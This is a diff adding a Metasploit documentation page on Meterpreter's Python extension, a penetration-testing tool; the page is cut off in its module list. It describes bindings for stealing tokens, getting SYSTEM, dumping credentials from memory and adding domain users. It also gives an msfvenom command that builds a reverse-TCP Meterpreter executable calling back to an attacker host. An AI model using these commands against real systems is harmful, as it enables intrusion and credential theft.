@@ -1,0 +1,895 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <meta name="author" content="Meterpreter Versions 4,5" />
+  <title>Python Extension</title>
+  <style>
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    span.underline{text-decoration: underline;}
+    div.column{display: inline-block; vertical-align: top; width: 50%;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+  </style>
+  <link rel="stylesheet" href="../../styles.css" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,400;0,700;1,300;1,400&display=swap" />
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+</head>
+<body>
+
+<div id="main-outer-box">
+
+<nav class="right">
+  <ul>
+    <li style="display: inline;"> <a href="https://github.com/rapid7/metasploit-framework/tree/master/documentation/modules" target="_blank">Module Docs</a></li>
+    <li style="display: inline;"><a href="https://rapid7.github.io/metasploit-framework/api/" target="_blank">API</a></li>
+    <li style="display: inline;"><a href="https://github.com/rapid7/metasploit-framework" target="_blank">Metasploit GitHub</a></li>
+     <li style="display: inline;"><a href="../../search.html">Search</a></li>
+  </ul>
+</nav>
+
+<div id="my-header">
+  <a href="{{path-to-index}}">Metasploit Framework</a>
+</div>
+
+<div id="trunk-box">
+
+<div id="nav-box">
+<p>Contents:</p>
+<ul>
+<li>Getting-Started/
+<ul>
+<li><a href="../.././Getting-Started/Installing-Metasploit.html">Installing Metasploit</a></li>
+<li><a href="../.././Getting-Started/setting-up-metasploit-dev-enviroment.html">Setting up a Metasploit Developer Environment</a></li>
+<li>Contributing/
+<ul>
+<li><a href="../.././Getting-Started/Contributing/Code-Of-Conduct.html">Contributor Code of Conduct</a></li>
+<li><a href="../.././Getting-Started/Contributing/Contributing-to-Metasploit.html">Contributing to Metasploit</a></li>
+<li><a href="../.././Getting-Started/Contributing/Guidelines-for-Accepting-Modules-and-Enhancements.html">Guidelines for accepting modules and enhancements</a></li>
+<li><a href="../.././Getting-Started/Contributing/Adding-Release-Notes-to-PRs.html">Adding release notes to PRs</a></li>
+<li><a href="../.././Getting-Started/Contributing/Landing-Pull-Requests.html">Landing pull requests</a></li>
+<li><a href="../.././Getting-Started/Contributing/Keeping-in-sync-with-rapid7-master.html">Keep in sync with master</a></li>
+<li><a href="../.././Getting-Started/Contributing/How-to-add-and-update-gems-in-metasploit-framework.html">How to add and update gems</a></li>
+<li><a href="../.././Getting-Started/Contributing/How-to-deprecate-a-Metasploit-module.html">How to deprecate a Metasploit module</a></li>
+<li><a href="../.././Getting-Started/Contributing/Rolling-back-merges.html">Roll back merges</a></li>
+<li><a href="../.././Getting-Started/Contributing/Style-Tips.html">Style Tips</a></li>
+<li><a href="../.././Getting-Started/Contributing/Reporting-a-Bug.html">Metasploit Bug Reporting</a></li>
+<li><a href="../.././Getting-Started/Contributing/markdown-cheat-sheet.html">Markdown Cheat Sheet</a></li>
+</ul></li>
+<li>Kali-Linux/
+<ul>
+<li><a href="../.././Getting-Started/Kali-Linux/How-to-get-Oracle-Support-working-with-Kali-Linux.html">Use Oracle support with Kali Linux</a></li>
+</ul></li>
+<li><a href="../.././Getting-Started/Contact.html">Contact</a></li>
+</ul></li>
+<li>Internals/
+<ul>
+<li><a href="../.././Internals/workspaces.html">Workspaces</a></li>
+</ul></li>
+<li>Modules/
+<ul>
+<li><a href="../.././Modules/How-to-use-a-Metasploit-module-appropriately.html">Properly use a module</a></li>
+<li><a href="../.././Modules/Module-Documentation.html">Module documentation</a></li>
+<li><a href="../.././Modules/Handling-Module-Failures-with-fail_with.html">Handing modules failures with <code>fail_with</code></a></li>
+<li><a href="../.././Modules/Running-Private-Modules.html">Run private modules</a></li>
+<li><a href="../.././Modules/How-to-do-reporting-or-store-data-in-module-development.html">How to do reporting and store data during module development</a></li>
+<li><a href="../.././Modules/Using-ReflectiveDll-Injection.html">Using the ReflectiveDll loader in a Metasploit module</a></li>
+<li>Write-Modules/
+<ul>
+<li><a href="../.././Modules/Write-Modules/How-to-write-a-module-using-HttpServer-and-HttpClient.html">How to write a module using HTTPServer and HTTPClient</a></li>
+<li><a href="../.././Modules/Write-Modules/Writing-External-Metasploit-Modules.html">Writing External Metasploit Modules</a></li>
+<li><a href="../.././Modules/Write-Modules/get-started-writing-auxillary-module.html">Get started with writing an auxiliary module</a></li>
+<li><a href="../.././Modules/Write-Modules/How-to-write-a-HTTP-LoginScanner-Module.html">How to write a HTTP LoginScanner Module</a></li>
+<li><a href="../.././Modules/Write-Modules/Writing-External-Python-Modules.html">Writing Python Modules for Metasploit</a></li>
+<li><a href="../.././Modules/Write-Modules/get-started-writing-post-module.html">Get started with writing a post module</a></li>
+<li><a href="../.././Modules/Write-Modules/Writing-External-GoLang-Modules.html">Writing external GoLang modules</a></li>
+<li><a href="../.././Modules/Write-Modules/login-scanner.html">Create a Login Scanner Module</a></li>
+<li><a href="../.././Modules/Write-Modules/http-login-scanner.html">How to write a HTTP LoginScanner Module</a></li>
+</ul></li>
+<li><a href="../.././Modules/module-reference-identifiers.html">Reference Identifiers</a></li>
+</ul></li>
+<li>Exploits/
+<ul>
+<li><a href="../.././Exploits/use-exploits.html">Use exploits</a></li>
+<li><a href="../.././Exploits/Information-About-Unmet-Browser-Exploit-Requirements.html">Unmet browser exploit requirements</a></li>
+<li><a href="../.././Exploits/How-to-use-Powershell-in-an-exploit.html">Add PowerShell mixin to an exploit</a></li>
+<li><a href="../.././Exploits/How-to-clean-up-files-using-FileDropper.html">How to clean up files using FileDropper</a></li>
+<li><a href="../.././Exploits/How-to-use-PhpEXE-to-exploit-an-arbitrary-file-upload-bug.html">PhpEXE arbitrary file upload</a></li>
+<li><a href="../.././Exploits/How-to-use-Railgun-for-Windows-post-exploitation.html">Use Railgun for Windows</a></li>
+<li><a href="../.././Exploits/How-to-use-command-stagers.html">Use command stagers</a></li>
+<li><a href="../.././Exploits/exploit-ranking.html">Exploit Ranking</a></li>
+<li>Write-Exploits/
+<ul>
+<li><a href="../.././Exploits/Write-Exploits/writing-exploits.html">Get Started Writing an Exploit</a></li>
+<li><a href="../.././Exploits/Write-Exploits/How-to-use-WbemExec-for-a-write-privilege-attack-on-Windows.html">Write a privilege attack with WbemExec</a></li>
+<li><a href="../.././Exploits/Write-Exploits/How-to-Use-the-FILEFORMAT-mixin-to-create-a-file-format-exploit.html">How to use the FILEFORMAT mixin</a></li>
+<li><a href="../.././Exploits/Write-Exploits/How-to-write-a-browser-exploit-using-HttpServer.html">How to write a browser exploit using HTTP Server</a></li>
+<li><a href="../.././Exploits/Write-Exploits/How-to-write-a-browser-exploit-using-BrowserExploitServer.html">Write a browser exploit with BrowserExploitServer</a></li>
+</ul></li>
+</ul></li>
+<li>Payloads/
+<ul>
+<li><a href="../.././Payloads/how-payloads-work.html">How Payloads Work</a></li>
+<li><a href="../.././Payloads/payload-debugging.html">Payload Debugging</a></li>
+<li><a href="../.././Payloads/Payload-UUID.html">Payload UUID</a></li>
+<li>Meterpreter/
+<ul>
+<li><a href="about-meterpreter.html">About Meterpreter</a></li>
+<li><a href="meterpreter-configuration.html">Meterpreter Configuration</a></li>
+<li><a href="transport-control.html">Transport Control</a></li>
+<li><a href="Meterpreter-Reliable-Network-Communication.html">Reliable Network Communication</a></li>
+<li><a href="Meterpreter-Unicode-Support.html">Unicode Support</a></li>
+<li><a href="Meterpreter-HTTP-Communication.html">Meterpreter HTTP communication</a></li>
+<li><a href="Meterpreter-Sleep-Control.html">Sleep Control</a></li>
+<li><a href="Meterpreter-Paranoid-Mode.html">Paranoid Mode</a></li>
+<li><a href="The-ins-and-outs-of-HTTP-and-HTTPS-communications-in-Meterpreter-and-Metasploit-Stagers.html">HTTP and HTTPS communication</a></li>
+<li><strong>Python Extension</strong></li>
+</ul></li>
+<li>msfvenom/
+<ul>
+<li><a href="../.././Payloads/msfvenom/How-to-use-msfvenom.html">How to use msfvenom</a></li>
+</ul></li>
+<li>Shell/
+<ul>
+<li><a href="../.././Payloads/Shell/How-to-use-a-reverse-shell-in-Metasploit.html">How to use a reverse shell</a></li>
+</ul></li>
+</ul></li>
+<li>Utilities/
+<ul>
+<li><a href="../.././Utilities/complier-windows-c.html">How to use Metasploit Framework Compiler Windows to compile C code</a></li>
+<li><a href="../.././Utilities/oracle-support-kali-linux.html">Oracle Support working with Kali Linux</a></li>
+<li><a href="../.././Utilities/How-to-zip-files-with-Msf-Util-EXE.to_zip.html">How to zip files with Msf::Util::EXE.to_zip</a></li>
+<li><a href="../.././Utilities/How-to-use-the-Msf-Exploit-Remote-Tcp-mixin.html">How to use the Msf::Exploit::Remote::Tcp mixin</a></li>
+</ul></li>
+<li>Evasion-and-Obfuscation/
+<ul>
+<li><a href="../.././Evasion-and-Obfuscation/obfuscation-crandomizer.html">CRandomizer</a></li>
+<li><a href="../.././Evasion-and-Obfuscation/How-to-obfuscate-JavaScript-in-Metasploit.html">Obfuscate JavaScript</a></li>
+<li><a href="../.././Evasion-and-Obfuscation/How-to-use-Metasploit-Framework-Obfuscation-CRandomizer.html">How to use CRandomizer</a></li>
+</ul></li>
+<li>API/
+<ul>
+<li><a href="../.././API/Metasploit-Web-Service.html">Metasploit web service</a></li>
+<li><a href="../.././API/Metasploit-as-a-service.html">Metasploit as a service</a></li>
+</ul></li>
+<li>Debugging/
+<ul>
+<li><a href="../.././Debugging/How-to-log-in-Metasploit.html">Log Files in Metasploit</a></li>
+<li><a href="../.././Debugging/Why-CVE-is-not-available.html">Why is a CVE Not Available?</a></li>
+</ul></li>
+<li><a href="../.././external-resources.html">Community Resources</a></li>
+</ul>
+
+</div>
+
+<div id="article-box">
+
+<div id="header-nav-bar">
+<div><a href="The-ins-and-outs-of-HTTP-and-HTTPS-communications-in-Meterpreter-and-Metasploit-Stagers.html">←prev</a></div><div class="nav-bar-push"><a href="../.././Payloads/msfvenom/How-to-use-msfvenom.html">next→</a></div>
+</div>
+
+<div id="article-content">
+<header id="title-block-header">
+<h1 class="title">Python Extension</h1>
+<p class="author">Meterpreter Versions 4,5</p>
+</header>
+<nav id="TOC" role="doc-toc">
+<ul>
+<li><a href="#usage">Usage</a>
+<ul>
+<li><a href="#python_execute">python_execute</a></li>
+<li><a href="#python_import">python_import</a></li>
+<li><a href="#python_reset">python_reset</a></li>
+<li><a href="#meterpreter-bindings">Meterpreter Bindings</a>
+<ul>
+<li><a href="#binding-list">Binding list</a></li>
+<li><a href="#bindings-example">Bindings example</a></li>
+</ul></li>
+<li><a href="#stageless-initialisation">Stageless Initialisation</a></li>
+</ul></li>
+<li><a href="#faq">FAQ</a></li>
+<li><a href="#currently-loadable-native-libraries">Currently Loadable Native Libraries</a></li>
+</ul>
+</nav>
+<p>For quite some time, Meterpreter users have wanted the ability to run arbitrary scripts under the context of a session on the target machine. While Railgun gives coders the ability to execute arbitrary Win32 API calls, it doesn’t really give them the ability to script the client in a single-shot.</p>
+<p>Meterpreter now has a new extension that aims to solve this problem by providing a completely in-memory Python interpreter that can load scripts, run ad-hoc python commands, and also provides bindings to Meterpreter itself. The extension comes with many (but not <em>all</em>) of the built-in functionality you would expect to see in a running Python interpreter. This includes the likes of <code>ctypes</code> for easy automation of Win32-related functions. We’ve even taken steps to make this extension piggy-back onto <code>metsrv</code>’s copy of the SSL libraries in an effort to reduce the size of the resulting binary.</p>
+<p>This page aims to document the features, show examples of how it can be used, and answer a few common questions that come up.</p>
+<p>Unfortunately, at this point in time the extension only works inside x86 and x64 Meterpreters running on Windows targets. However, there are plans to enable this functionality on other implementations over time.</p>
+<h1 id="usage">Usage</h1>
+<p>As with any other extension that comes with Meterpreter, loading it is very simple:</p>
+<pre><code>meterpreter &gt; use python
+Loading extension python...success.</code></pre>
+<p>Once loaded, the help system shows the commands that come with the extension:</p>
+<pre><code>meterpreter &gt; help
+
+    ... snip ...
+
+Python Commands
+===============
+
+    Command         Description
+    -------         -----------
+    python_execute  Execute a python command string
+    python_import   Import/run a python file or module
+    python_reset    Resets/restarts the Python interpreter</code></pre>
+<p>Each of these commands is discussed in detail below.</p>
+<h2 id="python_execute">python_execute</h2>
+<p>The <code>python_execute</code> command is the simplest of all commands that come with the extension, and provides the means to run single-shot lines of Python code, much in the same way that the normal Python interpreter functions from the command-line when using the <code>-c</code> switch. The full help for the command is as follows:</p>
+<pre><code>meterpreter &gt; python_execute -h
+Usage: python_execute &lt;python code&gt; [-r result var name]
+
+Runs the given python string on the target. If a result is required,
+it should be stored in a python variable, and that variable should
+passed using the -r parameter.
+
+OPTIONS:
+
+    -h        Help banner
+    -r &lt;opt&gt;  Name of the variable containing the result (optional)</code></pre>
+<p>A very simple example of this command is shown below:</p>
+<pre><code>meterpreter &gt; python_execute &quot;print &#39;Hi, from Meterpreter!&#39;&quot;
+[+] Content written to stdout:
+Hi, from Meterpreter!</code></pre>
+<p>Notice that any output that is written to stdout is captured by Meterpreter and returned to Metasploit so that it’s visible to the user. This also happens for anything written to stderr, as shown below:</p>
+<pre><code>meterpreter &gt; python_execute &quot;x = x + 1&quot;
+[-] Content written to stderr:
+Traceback (most recent call last):
+  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;
+NameError: name &#39;x&#39; is not defined</code></pre>
+<p>This handy feature now only allows users to see the output of their scripts, but it also means that any errors are completely visible too.</p>
+<p>A more interesting example can be seen below:</p>
+<pre><code>meterpreter &gt; python_execute &quot;x = [y for y in range(0, 20) if y % 5 == 0]&quot;
+[+] Command executed without returning a result</code></pre>
+<p>The command above executes, but nothing was printed to stdout, or to stderr, and hence nothing was captured.</p>
+<p>The good thing is that the Python extension is persistant across calls. This means that after the above command is executed, <code>x</code> is still present in the interpreter and can be accessed with another call:</p>
+<pre><code>meterpreter &gt; python_execute &quot;print x&quot;
+[+] Content written to stdout:
+[0, 5, 10, 15]</code></pre>
+<p>As useful as this is, developers may want to produce post-modules that make use of the data that a Python script has generated. Parsing stdout is not ideal in such a scenario, and hence this command provides the means for individual variables to be extracted directly using the <code>-r</code> paramter, as described by the help:</p>
+<pre><code>meterpreter &gt; python_execute &quot;x = [y for y in range(0, 20) if y % 5 == 0]&quot; -r x
+[+] x = [0, 5, 10, 15]</code></pre>
+<p>Note that this command requires the first parameter to be a string that contains code that needs to be executed. However, this string can be blank, resulting in no code being executed. This means that extraction of content generated in previous calls is still possible without executing more code, or rerunning previous code snippets just to make use of the <code>-r</code> parameter:</p>
+<pre><code>meterpreter &gt; python_execute &quot;&quot; -r x
+[+] x = [0, 5, 10, 15]</code></pre>
+<p>Behind the scenes, the result of the execution is a Ruby hash that contains all content written to stdout and stderr, and the content of the variable chosen using the <code>-r</code> parameter.</p>
+<p>Sometimes, single-line execution isn’t enough, or is cumbersome. The <code>python_import</code> command is provided to solve this problem and allow for scripts and modules to be loaded into the target from disk.</p>
+<h2 id="python_import">python_import</h2>
+<p>This command allows for whole modules to be loaded from the attacker’s machine an uploaded to the target interpreter. The full help is shown below:</p>
+<pre><code>meterpreter &gt; python_import -h
+Usage: python_import &lt;-f file path&gt; [-n mod name] [-r result var name]
+
+Loads a python code file or module from disk into memory on the target.
+The module loader requires a path to a folder that contains the module,
+and the folder name will be used as the module name. Only .py files will
+work with modules.
+
+OPTIONS:
+
+    -f &lt;opt&gt;  Path to the file (.py, .pyc), or module directory to import
+    -h        Help banner
+    -n &lt;opt&gt;  Name of the module (optional, for single files only)
+    -r &lt;opt&gt;  Name of the variable containing the result (optional, single files only)</code></pre>
+<p>Importing of module trees is still considered a <em>beta</em> feature, but we encourage you to use it where possible and keep us informed of any issues you may face.</p>
+<p>Consider the following script:</p>
+<pre><code>$ cat /tmp/drives.py
+import string
+from ctypes import windll
+
+def get_drives():
+    drives = []
+    bitmask = windll.kernel32.GetLogicalDrives()
+    for letter in string.uppercase:
+        if bitmask &amp; 1:
+            drives.append(letter)
+        bitmask &gt;&gt;= 1
+
+    return drives
+
+result = get_drives()
+print result</code></pre>
+<p>The aim of this is to determine all the local logical drives and put the letters into a list. From there it prints that list to screen. The result of running the script is as follows:</p>
+<pre><code>meterpreter &gt; python_import -f /tmp/drives.py
+[*] Importing /tmp/drives.py ...
+[+] Content written to stdout:
+[&#39;A&#39;, &#39;C&#39;, &#39;D&#39;, &#39;Z&#39;]</code></pre>
+<p>This shows that <code>ctypes</code> does indeed function correctly!</p>
+<p>This command is also intended to allow for recursive loading of modules from the local attacker file system, however this feature is still not yet ready for prime time and work is still actively being done on this area.</p>
+<h2 id="python_reset">python_reset</h2>
+<p>It may get to a point where the content of the interpreter needs to be flushed. The <code>python_reset</code> command clears out all imports, libraries and global variables:</p>
+<pre><code>meterpreter &gt; python_execute &quot;x = 100&quot;
+[+] Command executed without returning a result
+meterpreter &gt; python_execute &quot;print x&quot;
+[+] Content written to stdout:
+100
+
+meterpreter &gt; python_reset
+[+] Python interpreter successfully reset
+meterpreter &gt; python_execute &quot;print x&quot;
+[-] Content written to stderr:
+Traceback (most recent call last):
+  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;
+NameError: name &#39;x&#39; is not defined</code></pre>
+<h2 id="meterpreter-bindings">Meterpreter Bindings</h2>
+<p>A number of bindings are available to the Python extension that allow for interaction with the Meterpreter instance itself. They are broken up into logical modules based on the functionality that they provide. Bindings are available for other extensions as well, and hence in order to use them, those extensions must be loaded. If an extension is not present, and error is thrown. As soon as an extension is loaded, the function should work. Each of the following subsections shows a module namespace that must be imported for that module to function correctly.</p>
+<h3 id="binding-list">Binding list</h3>
+<h4 id="meterpreter.elevate">meterpreter.elevate</h4>
+<ul>
+<li><code>meterpreter.elevate.getsystem()</code> - maps directly to the <code>getsystem</code> command, however only attempts to use technique <code>1</code> because this is the only technique that doesn’t require a binary to be uploaded.</li>
+<li><code>meterpreter.elevate.rev2self()</code> - maps directly to the <code>rev2self</code> command.</li>
+<li><code>meterpreter.elevate.steal_token(pid)</code> - provides the ability to steal a token from another process.
+<ul>
+<li><code>pid</code> - the identifier of the process to steal the token from.</li>
+</ul></li>
+<li><code>meterpreter.elevate.drop_token()</code> - drops the token that was stolen using <code>steal_token</code>.</li>
+</ul>
+<h4 id="meterpreter.extapi-requires-the-extapi-extension">meterpreter.extapi (requires the extapi extension)</h4>
+<p>Each of the following functions takes the following parameters:</p>
+<ul>
+<li><code>domain_name</code> - the name of the domain that will be enumerated.</li>
+<li><code>max_results</code> - maximum number of results (default <code>None</code>).</li>
+<li><code>page_size</code> - the size of the results page (default <code>None</code>).</li>
+</ul>
+<p>The full list of available functions is as follows:</p>
+<ul>
+<li><code>meterpreter.extapi.adsi.enum_dcs(domain_name, max_results, page_size)</code> - enumerate the domain controllers on the given domain.</li>
+<li><code>meterpreter.extapi.adsi.enum_users(domain_name, max_results, page_size)</code> - enumerate users on the given domain.</li>
+<li><code>meterpreter.extapi.adsi.enum_group_users_nested(domain_name, group_dn, max_results, page_size)</code> - enumerate users in the given group recursively.
+<ul>
+<li><code>group_dn</code> - The distinguished name of the group to enumerate.</li>
+</ul></li>
+<li><code>meterpreter.extapi.adsi.enum_computers(domain_name, max_results, page_size)</code> - enumerate computers on the given domain.</li>
+<li><code>meterpreter.extapi.adsi.domain_query(domain_name, query_filter, fields, max_results, page_size)</code> - provides a generic query mechanism to ADSI. All other functions in this library make use of this function.
+<ul>
+<li><code>query_filter</code> - the LDAP-formatted query filter for the query.</li>
+<li><code>fields</code> - list of fields to extract from the query results.</li>
+</ul></li>
+</ul>
+<h4 id="meterpreter.fs">meterpreter.fs</h4>
+<ul>
+<li><code>meterpreter.fs.show_mount()</code> - maps to the <code>show_mount</code> command and lists all logical drives on the target.</li>
+</ul>
+<h4 id="meterpreter.incognito-requires-the-incognito-extension">meterpreter.incognito (requires the incognito extension)</h4>
+<ul>
+<li><code>meterpreter.incognito.list_user_tokens()</code> - list all available user tokens.</li>
+<li><code>meterpreter.incognito.list_group_tokens()</code> - list all available group tokens.</li>
+<li><code>meterpreter.incognito.impersonate(user)</code> - impersonate the given user.
+<ul>
+<li><code>user</code> - name of the user/group to impersonate in <code>DOMAIN\user</code> format.</li>
+</ul></li>
+<li><code>meterpreter.incognito.snarf_hashes(server)</code> - run the <code>snarf_hashes</code> functionality using the specified server.
+<ul>
+<li><code>server</code> - name of the server that is in place and ready to snarf the hashes.</li>
+</ul></li>
+<li><code>meterpreter.incognito.add_user(server, username, password)</code> - add a user to the given server.
+<ul>
+<li><code>server</code> - name of the server to use when adding the user.</li>
+<li><code>username</code> - name of the user to create.</li>
+<li><code>password</code> - password for the new user.</li>
+</ul></li>
+<li><code>meterpreter.incognito.add_group_user(server, group, username)</code> - add a user to a group (domain).
+<ul>
+<li><code>server</code> - name of the server to use when adding the user to a group.</li>
+<li><code>group</code> - name of the group to add the user to.</li>
+<li><code>username</code> - name of the user to add to the group.</li>
+</ul></li>
+<li><code>meterpreter.incognito.add_localgroup_user(server, group, username)</code> - add a user to a group (local).
+<ul>
+<li><code>server</code> - name of the server to use when adding the user to a group.</li>
+<li><code>group</code> - name of the group to add the user to.</li>
+<li><code>username</code> - name of the user to add to the group.</li>
+</ul></li>
+</ul>
+<h4 id="meterpreter.kiwi-requires-the-kiwi-extension">meterpreter.kiwi (requires the kiwi extension)</h4>
+<ul>
+<li><code>meterpreter.kiwi.creds_all()</code> - matches the <code>creds_all</code> command from the kiwi extension and returns a full list of all credentials that can be pulled from memory.</li>
+</ul>
+<h4 id="meterpreter.sys">meterpreter.sys</h4>
+<ul>
+<li><code>meterpreter.sys.info()</code> - matches the <code>sysinfo</code> command and shows system information.</li>
+<li><code>meterpreter.sys.ps_list()</code> - matches the <code>ps</code> command and lists the processes on the target.</li>
+</ul>
+<h4 id="meterpreter.transport">meterpreter.transport</h4>
+<ul>
+<li><code>meterpreter.transport.list()</code> - list all transports in the target.</li>
+<li><code>meterpreter.transport.add(url, session_expiry, comm_timeout, retry_total, retry_wait, ua, proxy_host, proxy_user, proxy_pass, cert_hash)</code> - allows for transports to be added to the Meterpreter session. All but the <code>url</code> parameter come with a sane default. Full details of each of these parameters can be found in the <a href="https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Transport-Control">transport</a> documentation.</li>
+</ul>
+<p>It is not possible to delete transports using the python extension as this opens the door to many kinds of failure.</p>
+<h4 id="meterpreter.user">meterpreter.user</h4>
+<ul>
+<li><code>meterpreter.user.getuid()</code> - gets the UID of the current session.</li>
+<li><code>meterpreter.user.getsid()</code> - gets the SID of the current session.</li>
+<li><code>meterpreter.user.is_system()</code> - determines if the current session is running as the <code>SYSTEM</code> user.</li>
+</ul>
+<h3 id="bindings-example">Bindings example</h3>
+<pre><code>meterpreter &gt; getuid
+Server username: WIN-TV01I7GG7JK\oj
+meterpreter &gt; python_execute &quot;import meterpreter.user; print meterpreter.user.getuid()&quot;
+[+] Content written to stdout:
+WIN-TV01I7GG7JK\oj
+
+meterpreter &gt; python_execute &quot;import meterpreter.elevate; meterpreter.elevate.getsystem()&quot;
+[+] Command executed without returning a result
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter &gt; python_execute &quot;meterpreter.elevate.rev2self(); print meterpreter.user.getuid()&quot;
+[+] Content written to stdout:
+WIN-TV01I7GG7JK\oj
+
+meterpreter &gt; use incognito
+Loading extension incognito...success.
+meterpreter &gt; python_execute &quot;import meterpreter.incognito; print meterpreter.incognito.list_user_tokens()&quot;
+[+] Content written to stdout:
+{&#39;Delegation&#39;: [&#39;NT AUTHORITY\\LOCAL SERVICE&#39;, &#39;NT AUTHORITY\\NETWORK SERVICE&#39;, &#39;NT AUTHORITY\\SYSTEM&#39;, &#39;WIN-TV01I7GG7JK\\oj&#39;], &#39;Impersonation&#39;: [&#39;NT AUTHORITY\\ANONYMOUS LOGON&#39;]}
+
+meterpreter &gt; python_execute &quot;import meterpreter.fs; print meterpreter.fs.show_mount()&quot;
+[+] Content written to stdout:
+[{&#39;Name&#39;: &#39;A:\\&#39;, &#39;SpaceUser&#39;: None, &#39;SpaceTotal&#39;: None, &#39;UNC&#39;: None, &#39;SpaceFree&#39;: None, &#39;Type&#39;: 2}, {&#39;Name&#39;: &#39;C:\\&#39;, &#39;SpaceUser&#39;: 28950585344L, &#39;SpaceTotal&#39;: 64422408192L, &#39;UNC&#39;: None, &#39;SpaceFree&#39;: 28950585344L, &#39;Type&#39;: 3}, {&#39;Name&#39;: &#39;D:\\&#39;, &#39;SpaceUser&#39;: None, &#39;SpaceTotal&#39;: None, &#39;UNC&#39;: None, &#39;SpaceFree&#39;: None, &#39;Type&#39;: 5}]</code></pre>
+<p>Each of the examples above just show the results printed to stdout, however the values are returned as Python dictionaries and can be operated on just like normal variables.</p>
+<h2 id="stageless-initialisation">Stageless Initialisation</h2>
+<p>Not only can the extension be baked into a stageless Meterpreter, like any other extension, it also has the ability to run an arbitrary script before the Meterpreter session is even established! Consider the following script:</p>
+<pre><code>$  cat /tmp/met.py
+import meterpreter.transport
+meterpreter.transport.add(&quot;tcp://127.0.0.1:8000&quot;)</code></pre>
+<p>This is a simple script that uses the Meterpreter bindings to add a new transport to the list of transports. This is executed immediately before Meterpreter attempts to create a connection back to Metasploit for the first time. The intent is to show that it’s possible to add any number of transports on startup.</p>
+<p>To create a stageless payload that uses this script, we can make use of the <code>EXTINIT</code> parameter in <code>msfvenom</code>:</p>
+<pre><code>$ msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4445 EXTENSIONS=stdapi,priv,python EXTINIT=python,/tmp/met.py -f exe -o /tmp/met-stageless.exe
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 6412437 bytes
+Saved as: /tmp/met-stageless.exe</code></pre>
+<p>When this payload is executed, the transport is added and shown to be present in the transport list immediately:</p>
+<pre><code>msf exploit(handler) &gt; [*] Meterpreter session 2 opened (172.16.52.1:4445 -&gt; 172.16.52.247:49159) at 2015-12-13 11:06:54 +1000
+
+msf exploit(handler) &gt; sessions -i -1
+[*] Starting interaction with 2...
+
+meterpreter &gt; transport list
+Session Expiry  : @ 2015-12-20 11:06:52
+
+    ID  Curr  URL                     Comms T/O  Retry Total  Retry Wait
+    --  ----  ---                     ---------  -----------  ----------
+    1         tcp://127.0.0.1:8000    300        3600         10
+    2   *     tcp://172.16.52.1:4445  300        3600         10</code></pre>
+<p>This stageless initialisation feature allows for long-running Python scripts to be run before Meterpreter even calls home. This is really handy in so many ways, so get creative and show us how awesome this can be.</p>
+<h1 id="faq">FAQ</h1>
+<blockquote>
+<p>Does the extension do dynamic resolution of Python libraries at runtime?</p>
+</blockquote>
+<p>Yes. The extension has a built-in import handler that loads modules from memory. This includes modules that the user has dynamically loaded using the <code>python_import</code> command. If a module doesn’t exist as part of the extension then resolution will fail. Down the track we may look into extending this feature so that missing libraries are uploaded on-the-fly when an import fails, but it’s not known when this work will get done.</p>
+<blockquote>
+<p>When will this extension be available for other Meterpreters?</p>
+</blockquote>
+<p>We’re not yet able to put a timeline on this.</p>
+<blockquote>
+<p>Is it possible to use the Python extension to run Responder?</p>
+</blockquote>
+<p>Unfortunately, no it is not. Responder makes the assumption that port <code>445</code> is available for use on the target, which is why it functions nicely on *nix systems that don’t make use of this port by default. On Windows systems, port <code>445</code> is already in use by system services and hence can’t be bound to.</p>
+<p>There is a Powershell-based project that aims to do the same thing as Responder, and that is called <a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a>. This utility piggy-backs of the existing SMB service, and appears to do quite a good job of stealing hashes, so it’s recommended that this be used instead.</p>
+<blockquote>
+<p>Is it perfect?</p>
+</blockquote>
+<p>Hell no! But the goal is to get closer and closer to perfect as we go. It’s up to you to help us improve it along the way by using it in interesting ways, and submitting bugs when it breaks.</p>
+<blockquote>
+<p>Can I suggest a feature?</p>
+</blockquote>
+<p>Please do, making good use of the Github issues feature. Better still, create a PR for one!</p>
+<h1 id="currently-loadable-native-libraries">Currently Loadable Native Libraries</h1>
+<pre><code>__future__
+__phello__
+_abcoll
+_osx_support
+_pyio
+_strptime
+_threading_local
+_weakrefset
+abc
+aifc
+antigravity
+argparse
+asynchat
+asyncore
+atexit
+audiodev
+base64
+BaseHTTPServer
+Bastion
+bdb
+binhex
+bisect
+calendar
+cgi
+CGIHTTPServer
+cgitb
+chunk
+cmd
+code
+codecs
+codeop
+collections
+colorsys
+commands
+compileall
+compiler
+compiler.ast
+compiler.consts
+compiler.future
+compiler.misc
+compiler.pyassem
+compiler.pycodegen
+compiler.symbols
+compiler.syntax
+compiler.transformer
+compiler.visitor
+ConfigParser
+contextlib
+Cookie
+cookielib
+copy
+copy_reg
+cProfile
+csv
+ctypes
+ctypes._endian
+ctypes.util
+ctypes.wintypes
+decimal
+difflib
+dircache
+dis
+DocXMLRPCServer
+dummy_thread
+dummy_threading
+email
+email._parseaddr
+email.base64mime
+email.charset
+email.encoders
+email.errors
+email.feedparser
+email.generator
+email.header
+email.iterators
+email.message
+email.parser
+email.quoprimime
+email.utils
+email.mime
+email.mime.application
+email.mime.audio
+email.mime.base
+email.mime.image
+email.mime.message
+email.mime.multipart
+email.mime.nonmultipart
+email.mime.text
+encodings
+encodings.aliases
+encodings.ascii
+encodings.base64_codec
+encodings.charmap
+encodings.cp037
+encodings.cp1006
+encodings.cp1026
+encodings.cp1140
+encodings.cp1250
+encodings.cp1251
+encodings.cp1252
+encodings.cp1253
